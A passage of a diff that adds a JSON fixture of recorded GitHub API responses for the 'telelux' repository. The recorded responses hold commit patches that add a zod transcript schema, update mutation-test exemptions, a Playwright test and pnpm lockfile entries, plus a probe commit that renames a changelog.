+          "patch": "@@ -0,0 +1,70 @@\n+import { z } from 'zod';\n+\n+const metadataPrimitive = z.union([z.string(), z.number(), z.boolean()]);\n+const metadataLeaf = z.union([metadataPrimitive, z.array(metadataPrimitive)]);\n+const metadataSchema = z.record(\n+  z.string(),\n+  z.union([metadataLeaf, z.record(z.string(), metadataLeaf), z.undefined()]),\n+);\n+\n+const contentSchema = z.object({\n+  type: z.enum(['text', 'image', 'reasoning']),\n+  text: z.string().optional(),\n+  reasoning: z.string().optional(),\n+  signature: z.string().nullish(),\n+  redacted: z.boolean().optional(),\n+  refusal: z.string().nullish(),\n+});\n+\n+const toolCallSchema = z.object({\n+  id: z.string(),\n+  function: z.string(),\n+  type: z.string(),\n+  arguments: z.record(z.string(), z.unknown()).optional(),\n+  view: z.object({ content: z.string(), format: z.string() }).optional(),\n+});\n+\n+const messageBase = {\n+  content: z.union([z.string(), z.array(contentSchema)]),\n+  metadata: metadataSchema.optional(),\n+};\n+\n+const chatMessageSchema = z.discriminatedUnion('role', [\n+  z.object({ role: z.literal('system'), ...messageBase }),\n+  z.object({ role: z.literal('user'), ...messageBase, tool_call_id: z.string().optional() }),\n+  z.object({ role: z.literal('assistant'), ...messageBase, tool_calls: z.array(toolCallSchema).optional() }),\n+  z.object({\n+    role: z.literal('tool'),\n+    ...messageBase,\n+    tool_call_id: z.string().optional(),\n+    function: z.string().optional(),\n+    error: z.object({ type: z.string(), message: z.string() }).optional(),\n+  }),\n+]);\n+\n+const transcriptSchema = z.object({\n+  id: z.string(),\n+  name: z.string().nullish(),\n+  transcript_group_id: z.string().nullish(),\n+  created_at: z.string().nullish(),\n+  messages: z.array(chatMessageSchema),\n+  metadata: metadataSchema,\n+});\n+\n+export type Metadata = z.infer<typeof metadataSchema>;\n+export type Content = z.infer<typeof contentSchema>;\n+export type ToolCall = z.infer<typeof toolCallSchema>;\n+export type ChatMessage = z.infer<typeof chatMessageSchema>;\n+export type Transcript = z.infer<typeof transcriptSchema>;\n+\n+export type ParseResult =\n+  | { ok: true; transcript: Transcript }\n+  | { ok: false; error: string };\n+\n+export function parseTranscript(value: unknown): ParseResult {\n+  const result = transcriptSchema.safeParse(value);\n+  if (result.success) {\n+    return { ok: true, transcript: value as Transcript };\n+  }\n+  return { ok: false, error: z.prettifyError(result.error) };\n+}"
+        },
+        {
+          "sha": "8b389df8a02f44181720f619af3bedca91efb851",
+          "filename": "packages/node/telelux-element/testing-conventions.toml",
+          "status": "modified",
+          "additions": 8,
+          "deletions": 2,
+          "changes": 10,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Ftesting-conventions.toml",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Ftesting-conventions.toml",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Ftesting-conventions.toml?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -18,6 +18,12 @@ reason = \"vitest configuration, not shipped source; it has to live in src/ becau\n \n [[typescript.exempt]]\n path = \"telelux-transcript.ts\"\n-lines = [4, 5, 9]\n+lines = [7, 8, 9]\n rules = [\"mutation\"]\n-reason = \"render() runs from Lit's own update scheduler on a microtask queued by requestUpdate, outside the synchronous call stack stryker's per-test coverage instrumentation tracks, and customElements.define runs once at module load before that instrumentation activates. Applied by hand, each of these three mutants (an empty render body, an empty template literal, an empty tag name) fails the shadow-root assertion in telelux-transcript.test.ts — the suite does kill them, the runner just cannot attribute it. Same class of false negative as packages/node/telelux-web/testing-conventions.toml's TranscriptBox.tsx exemption\"\n+reason = \"static mutants: the reactive property table is read once when Lit registers the class at module load, before stryker's per-test instrumentation activates, so no test is recorded as covering it. Applied by hand, emptying the table fails every property-driven test in telelux-transcript.test.ts, and flipping attribute to true fails 'ignores a transcript attribute' — the suite kills them, the runner just cannot attribute it\"\n+\n+[[typescript.exempt]]\n+path = \"transcript.ts\"\n+lines = [3, 4, 7, 10, 11, 19, 24, 27, 28, 32, 33, 34, 35, 36, 37, 41, 45]\n+rules = [\"mutation\"]\n+reason = \"static mutants: the zod schemas are built once at module load, before stryker's per-test instrumentation activates, so no test is recorded as covering them. Applied by hand (an empty role literal, an empty metadata union, an empty content-type enum), each fails the parseTranscript accept/reject cases in transcript.test.ts — the suite kills them, the runner just cannot attribute it. parseTranscript's own lines are not exempt\""
+        },
+        {
+          "sha": "16d7e8e45476bfebc8c329969d2b9298edd75018",
+          "filename": "packages/node/telelux-element/tests/integration/telelux-transcript.test.ts",
+          "status": "modified",
+          "additions": 4,
+          "deletions": 2,
+          "changes": 6,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Ftests%2Fintegration%2Ftelelux-transcript.test.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Ftests%2Fintegration%2Ftelelux-transcript.test.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Ftests%2Fintegration%2Ftelelux-transcript.test.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -1,9 +1,11 @@\n import { expect, test } from '@playwright/test';\n \n test.describe('the telelux-transcript element in a real page', () => {\n-  test('renders hello world', async ({ page }) => {\n+  test('shows the first message of a transcript assigned from a script', async ({ page }) => {\n     await page.goto('/');\n \n-    await expect(page.locator('telelux-transcript')).toContainText('hello world');\n+    const element = page.locator('telelux-transcript');\n+    await expect(element.locator('li').first()).toContainText('What time is it in Tokyo?');\n+    await expect(element.locator('li')).toHaveCount(4);\n   });\n });"
+        },
+        {
+          "sha": "711520586900ce251cccb598a11d2ac229c1b373",
+          "filename": "pnpm-lock.yaml",
+          "status": "modified",
+          "additions": 185,
+          "deletions": 4,
+          "changes": 189,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/pnpm-lock.yaml",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/pnpm-lock.yaml",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/pnpm-lock.yaml?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -74,6 +74,9 @@ importers:\n       lit:\n         specifier: ^3.3.3\n         version: 3.3.3\n+      zod:\n+        specifier: ^4.6.5\n+        version: 4.6.5\n     devDependencies:\n       '@playwright/test':\n         specifier: ^1.63.0\n@@ -91,8 +94,8 @@ importers:\n         specifier: ^8.61.0\n         version: 8.70.1(eslint@10.11.0)(typescript@5.9.3)\n       '@vitest/coverage-v8':\n-        specifier: ^5.0.1\n-        version: 5.0.1(vitest@5.0.1)\n+        specifier: ^4.1.11\n+        version: 4.1.11(vitest@4.1.11)\n       eslint:\n         specifier: ^10.4.1\n         version: 10.11.0\n@@ -109,8 +112,8 @@ importers:\n         specifier: ^5.1.1\n         version: 5.1.1(rolldown@1.2.10)(rollup@4.63.5)(typescript@5.9.3)(vite@8.3.0(@types/node@22.20.4))\n       vitest:\n-        specifier: ^5.0.1\n-        version: 5.0.1(@types/node@22.20.4)(@vitest/coverage-v8@5.0.1)(jsdom@30.1.1)(vite@8.3.0(@types/node@22.20.4))\n+        specifier: ^4.1.11\n+        version: 4.1.11(@types/node@22.20.4)(@vitest/coverage-v8@4.1.11)(jsdom@30.1.1)(vite@8.3.0(@types/node@22.20.4))\n \n   packages/node/telelux-web:\n     dependencies:\n@@ -946,6 +949,9 @@ packages:\n   '@shikijs/vscode-textmate@10.0.2':\n     resolution: {integrity: sha512-83yeghZ2xxin3Nj8z1NMd/NCuca+gsYXswywDy5bHvwlWL8tpTQmzGeUuHd9FC3E/SBEMvzJRwWEOz5gGes9Qg==}\n \n+  '@standard-schema/spec@1.1.0':\n+    resolution: {integrity: sha512-l2aFy5jALhniG5HgqrD6jXLi/rUWrKvqN/qJx6yoJsgKhblVd+iqqU4RCXavm/jPityDo5TCvKMnpjKnOriy0w==}\n+\n   '@stylistic/eslint-plugin@5.10.0':\n     resolution: {integrity: sha512-nPK52ZHvot8Ju/0A4ucSX1dcPV2/1clx0kLcH5wDmrE4naKso7TUC/voUyU1O9OTKTrR6MYip6LP0ogEMQ9jPQ==}\n     engines: {node: ^18.18.0 || ^20.9.0 || >=21.1.0}\n@@ -1128,6 +1134,15 @@ packages:\n       '@vitest/browser':\n         optional: true\n \n+  '@vitest/coverage-v8@4.1.11':\n+    resolution: {integrity: sha512-8MVGEFnJIcdGjcbfKmeq8z0pZHH0JlVtoVZH9Q/qwUp6wyFnEJUBMrw9DCaj+ra3vShGmhavjalMIhPNxZAUcw==}\n+    peerDependencies:\n+      '@vitest/browser': 4.1.11\n+      vitest: 4.1.11\n+    peerDependenciesMeta:\n+      '@vitest/browser':\n+        optional: true\n+\n   '@vitest/coverage-v8@5.0.1':\n     resolution: {integrity: sha512-FRC8ACiudC3dI6MTplzRSYWHDRnIv2IPfbzs4FdoJNsMal/35sWV8hwIfV8ZcqzSPy+uXHeMVONt9CEqtOU17w==}\n     peerDependencies:\n@@ -1140,6 +1155,9 @@ packages:\n   '@vitest/expect@3.2.7':\n     resolution: {integrity: sha512-E8eBXaKibuvH2pSZErOjdVb5vF4PbKYcrnluBTYxEk1l/VhhwZg1kZQsdtjq+CsF5CFydf2Rdkz7jDHKSisi3w==}\n \n+  '@vitest/expect@4.1.11':\n+    resolution: {integrity: sha512-VX2x5vNJXET47KAFzwERI+KRMtTTCSWTfSMKsW7JsUsXV4psq++e3DvZpuTDOpHcxytiDs6p2nhVb2tVDiiUYw==}\n+\n   '@vitest/istanbul-lib-coverage@1.0.1':\n     resolution: {integrity: sha512-k3DJZ8LhMBK9NS4SclF1ASD3OgXEWDorbIcPTRDK0/Zae6fRvu+fJRxtFdLfHsa9Y24beCdPnoNZ4LviTNstfA==}\n     engines: {node: '>=22'}\n@@ -1159,6 +1177,17 @@ packages:\n       vite:\n         optional: true\n \n+  '@vitest/mocker@4.1.11':\n+    resolution: {integrity: sha512-2XJVD55d1o5AZous5CCGKS74g/riOj9odEt2bQpCVZeblHyHdnMeFl4jl0XjU21stf4mbjUkew2eXQZt65g5CQ==}\n+    peerDependencies:\n+      msw: ^2.4.9\n+      vite: ^6.0.0 || ^7.0.0 || ^8.0.0\n+    peerDependenciesMeta:\n+      msw:\n+        optional: true\n+      vite:\n+        optional: true\n+\n   '@vitest/mocker@5.0.1':\n     resolution: {integrity: sha512-6K1DoBNAPGvuOcSsGA4D6x+5zEEff/KmOOP3uetT2TrGpVfI+HRHRnJJfKi5ib/g1vx8IYHQD8s0pbJz8WQI7Q==}\n     peerDependencies:\n@@ -1173,21 +1202,36 @@ packages:\n   '@vitest/pretty-format@3.2.7':\n     resolution: {integrity: sha512-KUHlwqVu0sRlhCdyPdQ/wBoTfRahjUky1MubOmYw9fWfIZy1gNoHpuaaQBPAaMaVYdQYHJLurzj8ECCj5OwTqA==}\n \n+  '@vitest/pretty-format@4.1.11':\n+    resolution: {integrity: sha512-yiZzPbGTS9Sr/JpFl8zHrcIkAofNbFV6k21vIgQN/cY/oxZeXhJv5sc/MBJ5jFKWmWs+oJHw0UXLZjmf931+Vw==}\n+\n   '@vitest/runner@3.2.7':\n     resolution: {integrity: sha512-sB9y4ovltoQP+WaUPwmSxO9WIg9Ig694Di5PalVPsYHklAdE027mehpWF2SQSVq+k6sFgaivbTjTJwZLSHbedA==}\n \n+  '@vitest/runner@4.1.11':\n+    resolution: {integrity: sha512-LztvUgdwMNJMIkj3hQnnxiC2Xy1zNxq928W/xhjCLaNCzqTZOudjwbQf6v9IntZGPw132i2Lq2rgTRZHD3JHNw==}\n+\n   '@vitest/snapshot@3.2.7':\n     resolution: {integrity: sha512-7C+MwShwtBSI5Buwoyg3s/iY1eHL9PKAf+O1wVh/TdnjXUtkoL/9YQtre90i4MtNXM6edP1wJ2zOBpfCyhIS7g==}\n \n+  '@vitest/snapshot@4.1.11':\n+    resolution: {integrity: sha512-pN7ikn1ON7h8ee4gIAp4AzyK+zBtJPzVbqOgu5LCEh4VaJVbPQcgYQYJIMGQPXVeJJq1fnfazis7a5pFNPahog==}\n+\n   '@vitest/spy@3.2.7':\n     resolution: {integrity: sha512-Q2eQGI6d2L/hBtZ0qNuKcAGid68XK6cv1xsoaIma6PaJhHPoqcEJhYpXZ/5myCMqkNgtP6UKuBhbc0nHKnrkuQ==}\n \n+  '@vitest/spy@4.1.11':\n+    resolution: {integrity: sha512-apNa/prQy2qCeywhnixOHPRCgGNhvg7T4Dapfl1GahLp/R+uhBm5cPyFoNVyqsNd2h1nJxL6BqqdIjiABL60YA==}\n+\n   '@vitest/spy@5.0.1':\n     resolution: {integrity: sha512-rbto/mF/SGERxEgYOek7Xm6B9b+y+mVoo+f4b2LymYO8zM1b7uB5nHuhVMTP2hxdzgxvGiZYGxGIaMvL5y180Q==}\n \n   '@vitest/utils@3.2.7':\n     resolution: {integrity: sha512-x6BDOd7dyo3PFLY3I9/HJ25X/6OurhGXk2/B9gOZNPF7XDVjeBK4k01lQE5uvDpbuheErh91qYuE1E2OEjK3Rw==}\n \n+  '@vitest/utils@4.1.11':\n+    resolution: {integrity: sha512-zTCVGpyFsGWBhllOyKlTw/vnr6D9qxsfSDyfbyZmTyjHw5N/VuvzHpHoQjm2ZJzn4RJgx5w4r7V0er69CmLgPQ==}\n+\n   '@volar/language-core@2.4.28':\n     resolution: {integrity: sha512-w4qhIJ8ZSitgLAkVay6AbcnC7gP3glYM3fYwKV3srj8m494E3xtrCv6E+bWviiK/8hs6e6t1ij1s2Endql7vzQ==}\n \n@@ -1407,6 +1451,9 @@ packages:\n   confbox@0.3.1:\n     resolution: {integrity: sha512-cKUSoKa8YxFZZSmraVi7onONx3amu77ngK3kGpsYHDH7drPwCRkQE1RYMPlLRrMtnciRj274XNRxcHxnKmDSnA==}\n \n+  convert-source-map@2.0.0:\n+    resolution: {integrity: sha512-Kvp459HrV2FEJ1CAsi1Ku+MY3kasH19TFykTz2xWmMeq6bk2NU3XXvfJ+Q61m0xktWwt+1HSYf3JZsTms3aRJg==}\n+\n   copy-anything@4.1.1:\n     resolution: {integrity: sha512-AoT6Imdr98feSpFfmFwTFN73ccdr7uFPf27cBCgYvyyRyn1BzLRxMvrHNmwXO5LJMddRy4Rdhw2b1h7vSMKsEw==}\n     engines: {node: '>=18'}\n@@ -2436,6 +2483,47 @@ packages:\n       jsdom:\n         optional: true\n \n+  vitest@4.1.11:\n+    resolution: {integrity: sha512-fhACrNXUidIbGSBr5FlbuBkO7VWC1ZyLl0DO4CU2DrQoAPxX84Ysxs+HeGQpii5lZWV1Q4gBZTTu49mF+A6Edw==}\n+    engines: {node: ^20.0.0 || ^22.0.0 || >=24.0.0}\n+    hasBin: true\n+    peerDependencies:\n+      '@edge-runtime/vm': '*'\n+      '@opentelemetry/api': ^1.9.0\n+      '@types/node': ^20.0.0 || ^22.0.0 || >=24.0.0\n+      '@vitest/browser-playwright': 4.1.11\n+      '@vitest/browser-preview': 4.1.11\n+      '@vitest/browser-webdriverio': 4.1.11\n+      '@vitest/coverage-istanbul': 4.1.11\n+      '@vitest/coverage-v8': 4.1.11\n+      '@vitest/ui': 4.1.11\n+      happy-dom: '*'\n+      jsdom: '*'\n+      vite: ^6.0.0 || ^7.0.0 || ^8.0.0\n+    peerDependenciesMeta:\n+      '@edge-runtime/vm':\n+        optional: true\n+      '@opentelemetry/api':\n+        optional: true\n+      '@types/node':\n+        optional: true\n+      '@vitest/browser-playwright':\n+        optional: true\n+      '@vitest/browser-preview':\n+        optional: true\n+      '@vitest/browser-webdriverio':\n+        optional: true\n+      '@vitest/coverage-istanbul':\n+        optional: true\n+      '@vitest/coverage-v8':\n+        optional: true\n+      '@vitest/ui':\n+        optional: true\n+      happy-dom:\n+        optional: true\n+      jsdom:\n+        optional: true\n+\n   vitest@5.0.1:\n     resolution: {integrity: sha512-iA95lQbKEkvrtTkdAgnWbXfbipWiiWe/hDl2P5tMi6WFwD76G0NxXAGp/M9EOcYupeGJRr6wppMc7CoA41TQjg==}\n     engines: {node: ^22.12.0 || ^24.0.0 || >=26.0.0}\n@@ -2547,6 +2635,9 @@ packages:\n     resolution: {integrity: sha512-rVksvsnNCdJ/ohGc6xgPwyN8eheCxsiLM8mxuE/t/mOVqJewPuO1miLpTHQiRgTKCLexL4MeAFVagts7HmNZ2Q==}\n     engines: {node: '>=10'}\n \n+  zod@4.6.5:\n+    resolution: {integrity: sha512-v5l/aFXZQeai4awLbOpSoHecE9UiMrnfx75tEXLjNonXVARxQ5mOeipTjROUchszUNCqnE+hqAMujRsRHsut2Q==}\n+\n   zwitch@2.0.4:\n     resolution: {integrity: sha512-bXE4cR/kVZhKZX/RjPEflHaKVhUVl85noU3v6b8apfQEc1x4A+zBxjZ4lN8LqGd6WZ3dl98pY4o717VFmoPp+A==}\n \n@@ -3236,6 +3327,8 @@ snapshots:\n \n   '@shikijs/vscode-textmate@10.0.2': {}\n \n+  '@standard-schema/spec@1.1.0': {}\n+\n   '@stylistic/eslint-plugin@5.10.0(eslint@10.11.0)':\n     dependencies:\n       '@eslint-community/eslint-utils': 4.10.1(eslint@10.11.0)\n@@ -3451,6 +3544,20 @@ snapshots:\n     transitivePeerDependencies:\n       - supports-color\n \n+  '@vitest/coverage-v8@4.1.11(vitest@4.1.11)':\n+    dependencies:\n+      '@bcoe/v8-coverage': 1.0.2\n+      '@vitest/utils': 4.1.11\n+      ast-v8-to-istanbul: 1.0.7\n+      istanbul-lib-coverage: 3.2.2\n+      istanbul-lib-report: 3.0.1\n+      istanbul-reports: 3.2.0\n+      magicast: 0.5.5\n+      obug: 2.2.1\n+      std-env: 4.2.0\n+      tinyrainbow: 3.1.1\n+      vitest: 4.1.11(@types/node@22.20.4)(@vitest/coverage-v8@4.1.11)(jsdom@30.1.1)(vite@8.3.0(@types/node@22.20.4))\n+\n   '@vitest/coverage-v8@5.0.1(vitest@5.0.1)':\n     dependencies:\n       '@bcoe/v8-coverage': 1.0.2\n@@ -3471,6 +3578,15 @@ snapshots:\n       chai: 5.3.3\n       tinyrainbow: 2.0.0\n \n+  '@vitest/expect@4.1.11':\n+    dependencies:\n+      '@standard-schema/spec': 1.1.0\n+      '@types/chai': 5.2.3\n+      '@vitest/spy': 4.1.11\n+      '@vitest/utils': 4.1.11\n+      chai: 6.2.2\n+      tinyrainbow: 3.1.1\n+\n   '@vitest/istanbul-lib-coverage@1.0.1': {}\n \n   '@vitest/istanbul-lib-report@1.0.1':\n@@ -3485,6 +3601,14 @@ snapshots:\n     optionalDependencies:\n       vite: 5.4.21(@types/node@22.20.4)(lightningcss@1.33.0)\n \n+  '@vitest/mocker@4.1.11(vite@8.3.0(@types/node@22.20.4))':\n+    dependencies:\n+      '@vitest/spy': 4.1.11\n+      estree-walker: 3.0.3\n+      magic-string: 0.30.21\n+    optionalDependencies:\n+      vite: 8.3.0(@types/node@22.20.4)\n+\n   '@vitest/mocker@5.0.1(vite@8.3.0(@types/node@22.20.4))':\n     dependencies:\n       '@jridgewell/trace-mapping': 0.3.31\n@@ -3498,22 +3622,40 @@ snapshots:\n     dependencies:\n       tinyrainbow: 2.0.0\n \n+  '@vitest/pretty-format@4.1.11':\n+    dependencies:\n+      tinyrainbow: 3.1.1\n+\n   '@vitest/runner@3.2.7':\n     dependencies:\n       '@vitest/utils': 3.2.7\n       pathe: 2.0.3\n       strip-literal: 3.1.0\n \n+  '@vitest/runner@4.1.11':\n+    dependencies:\n+      '@vitest/utils': 4.1.11\n+      pathe: 2.0.3\n+\n   '@vitest/snapshot@3.2.7':\n     dependencies:\n       '@vitest/pretty-format': 3.2.7\n       magic-string: 0.30.21\n       pathe: 2.0.3\n \n+  '@vitest/snapshot@4.1.11':\n+    dependencies:\n+      '@vitest/pretty-format': 4.1.11\n+      '@vitest/utils': 4.1.11\n+      magic-string: 0.30.21\n+      pathe: 2.0.3\n+\n   '@vitest/spy@3.2.7':\n     dependencies:\n       tinyspy: 4.0.6\n \n+  '@vitest/spy@4.1.11': {}\n+\n   '@vitest/spy@5.0.1': {}\n \n   '@vitest/utils@3.2.7':\n@@ -3522,6 +3664,12 @@ snapshots:\n       loupe: 3.2.1\n       tinyrainbow: 2.0.0\n \n+  '@vitest/utils@4.1.11':\n+    dependencies:\n+      '@vitest/pretty-format': 4.1.11\n+      convert-source-map: 2.0.0\n+      tinyrainbow: 3.1.1\n+\n   '@volar/language-core@2.4.28':\n     dependencies:\n       '@volar/source-map': 2.4.28\n@@ -3765,6 +3913,8 @@ snapshots:\n \n   confbox@0.3.1: {}\n \n+  convert-source-map@2.0.0: {}\n+\n   copy-anything@4.1.1: {}\n \n   crelt@1.0.7: {}\n@@ -4825,6 +4975,35 @@ snapshots:\n       - supports-color\n       - terser\n \n+  vitest@4.1.11(@types/node@22.20.4)(@vitest/coverage-v8@4.1.11)(jsdom@30.1.1)(vite@8.3.0(@types/node@22.20.4)):\n+    dependencies:\n+      '@vitest/expect': 4.1.11\n+      '@vitest/mocker': 4.1.11(vite@8.3.0(@types/node@22.20.4))\n+      '@vitest/pretty-format': 4.1.11\n+      '@vitest/runner': 4.1.11\n+      '@vitest/snapshot': 4.1.11\n+      '@vitest/spy': 4.1.11\n+      '@vitest/utils': 4.1.11\n+      es-module-lexer: 2.3.2\n+      expect-type: 1.4.0\n+      magic-string: 0.30.21\n+      obug: 2.2.1\n+      pathe: 2.0.3\n+      picomatch: 4.0.7\n+      std-env: 4.2.0\n+      tinybench: 2.9.0\n+      tinyexec: 1.3.0\n+      tinyglobby: 0.2.17\n+      tinyrainbow: 3.1.1\n+      vite: 8.3.0(@types/node@22.20.4)\n+      why-is-node-running: 2.3.0\n+    optionalDependencies:\n+      '@types/node': 22.20.4\n+      '@vitest/coverage-v8': 4.1.11(vitest@4.1.11)\n+      jsdom: 30.1.1\n+    transitivePeerDependencies:\n+      - msw\n+\n   vitest@5.0.1(@types/node@22.20.4)(@vitest/coverage-v8@5.0.1)(jsdom@30.1.1)(vite@8.3.0(@types/node@22.20.4)):\n     dependencies:\n       '@types/chai': 5.2.3\n@@ -4917,4 +5096,6 @@ snapshots:\n \n   yocto-queue@0.1.0: {}\n \n+  zod@4.6.5: {}\n+\n   zwitch@2.0.4: {}"
+        }
+      ]
+    }
+  },
+  {
+    "method": "getCommit",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "ref": "d885a8ddd115b809344ad0909f06da81ff3e4311"
+    },
+    "result": {
+      "sha": "d885a8ddd115b809344ad0909f06da81ff3e4311",
+      "node_id": "C_kwDOUcV3s9oAKGQ4ODVhOGRkZDExNWI4MDkzNDRhZDA5MDlmMDZkYTgxZmYzZTQzMTE",
+      "commit": {
+        "author": {
+          "name": "thekevinbot",
+          "email": "248217931+thekevinbot@users.noreply.github.com",
+          "date": "2026-09-25T11:57:13Z"
+        },
+        "committer": {
+          "name": "thekevinbot",
+          "email": "248217931+thekevinbot@users.noreply.github.com",
+          "date": "2026-09-25T11:57:13Z"
+        },
+        "message": "Probe: rename CHANGELOG.md out of packages/node/telelux\n\nA capture probe for a rename whose previous path matches\nnode-telelux.yml's paths filter. Not for merging.",
+        "tree": {
+          "sha": "c383a0119ab23b9c30aabd4d117d5069f89308d5",
+          "url": "https://api.github.com/repos/thekevinscott/telelux/git/trees/c383a0119ab23b9c30aabd4d117d5069f89308d5"
+        },
+        "url": "https://api.github.com/repos/thekevinscott/telelux/git/commits/d885a8ddd115b809344ad0909f06da81ff3e4311",
+        "comment_count": 0,
+        "verification": {
+          "verified": true,
+          "reason": "valid",
+          "signature": "-----BEGIN PGP SIGNATURE-----\n\niQIzBAABCgAdFiEEnU3Dh/cnWdmpxUeIBqUoxO3sGUIFAmq2YZkACgkQBqUoxO3s\nGUI/9g//SrWdTtEyvv0+zInldcll7CEeNt8T6W8k7QmdWmbd0gb1DvPaxka0wymw\n6tpdTRwGENkflEsvgwtpfcWEVkZV+nvozofdrtdf0GZ6W6R36vN8QnZxQ15aUWIN\nfRI9WfLHsBE+o6TQXmO2TfvTOA3pStOBgKvtD2i09De1cCi42nH+xcXPFw8xStiD\nXJIbhX8lBh3XSxNVHd4bYQecuLsJCN47EpbVZoV4DlYjjLClEEC/rrVSmK5L7MsD\nP1Byx0zLaRGiziyRRfKEpQMP7niU3kDW9biAmRC5yGl8F2ycUO8Xr1K4iGNxR6We\ncqT2zaQWEwB+y/k6iz9kDYaNI1kOS75bM+qRfBbjrv0sKZg1dZxrk79IzV7m7HxM\ncNLOoxhm7KGj7MxQyLLV3J1T0KsDbde48oVP7TNdht9L264yWmmWZWEdK5fhyuUF\nY1MhyxEJE/8di613W9eGdoOQ07d8uIbH5kggU8PZKgOeYOCaS1sPB4lO0rDNWXoa\nwVCVn+1/ws+PyDq08S8psTst7PJL5RG9J5df+3hr1a//AT5CNWegFhKcZ42v8uiq\nUCxiIpOwtCWTfcgyCPBw6q2GTqy6ktNxj0W+e190lsk2MwlOjUXAyzWgsCpvK6p5\naEuD3lF2oyJKM355ogNDmWUE71pw1jT1kGwMsQgXf/pNyvkp4H0=\n=PA3z\n-----END PGP SIGNATURE-----",
+          "payload": "tree c383a0119ab23b9c30aabd4d117d5069f89308d5\nparent bfc749a2b01f19cddac06c03d347b9663ebef86b\nauthor thekevinbot <248217931+thekevinbot@users.noreply.github.com> 1790337433 -0400\ncommitter thekevinbot <248217931+thekevinbot@users.noreply.github.com> 1790337433 -0400\n\nProbe: rename CHANGELOG.md out of packages/node/telelux\n\nA capture probe for a rename whose previous path matches\nnode-telelux.yml's paths filter. Not for merging.\n",
+          "verified_at": "2026-09-25T11:57:14Z"
+        }
+      },
+      "url": "https://api.github.com/repos/thekevinscott/telelux/commits/d885a8ddd115b809344ad0909f06da81ff3e4311",
+      "html_url": "https://github.com/thekevinscott/telelux/commit/d885a8ddd115b809344ad0909f06da81ff3e4311",
+      "comments_url": "https://api.github.com/repos/thekevinscott/telelux/commits/d885a8ddd115b809344ad0909f06da81ff3e4311/comments",
+      "author": {
+        "login": "thekevinbot",
+        "id": 248217931,
+        "node_id": "U_kgDODsuBSw",
+        "avatar_url": "https://avatars.githubusercontent.com/u/248217931?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinbot",
+        "html_url": "https://github.com/thekevinbot",
+        "followers_url": "https://api.github.com/users/thekevinbot/followers",
+        "following_url": "https://api.github.com/users/thekevinbot/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinbot/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinbot/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinbot/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinbot/orgs",
+        "repos_url": "https://api.github.com/users/thekevinbot/repos",
+        "events_url": "https://api.github.com/users/thekevinbot/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinbot/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "committer": {
+        "login": "thekevinbot",
+        "id": 248217931,
+        "node_id": "U_kgDODsuBSw",
+        "avatar_url": "https://avatars.githubusercontent.com/u/248217931?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinbot",
+        "html_url": "https://github.com/thekevinbot",
+        "followers_url": "https://api.github.com/users/thekevinbot/followers",
+        "following_url": "https://api.github.com/users/thekevinbot/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinbot/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinbot/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinbot/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinbot/orgs",
+        "repos_url": "https://api.github.com/users/thekevinbot/repos",
+        "events_url": "https://api.github.com/users/thekevinbot/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinbot/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "parents": [
+        {
+          "sha": "bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "url": "https://api.github.com/repos/thekevinscott/telelux/commits/bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "html_url": "https://github.com/thekevinscott/telelux/commit/bfc749a2b01f19cddac06c03d347b9663ebef86b"
+        }
+      ],
+      "stats": {
+        "total": 0,
+        "additions": 0,
+        "deletions": 0
+      },
+      "files": [
+        {
+          "sha": "4afb36adce42fb2613f90decc77058219c778690",
+          "filename": "archive/node-telelux-CHANGELOG.md",
+          "status": "renamed",
+          "additions": 0,
+          "deletions": 0,
+          "changes": 0,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/d885a8ddd115b809344ad0909f06da81ff3e4311/archive%2Fnode-telelux-CHANGELOG.md",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/d885a8ddd115b809344ad0909f06da81ff3e4311/archive%2Fnode-telelux-CHANGELOG.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/archive%2Fnode-telelux-CHANGELOG.md?ref=d885a8ddd115b809344ad0909f06da81ff3e4311",
+          "previous_filename": "packages/node/telelux/CHANGELOG.md"
+        }
+      ]
+    }
+  },
+  {
+    "method": "listWorkflows",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux"
+    },
+    "result": [
+      {
+        "id": 358967717,
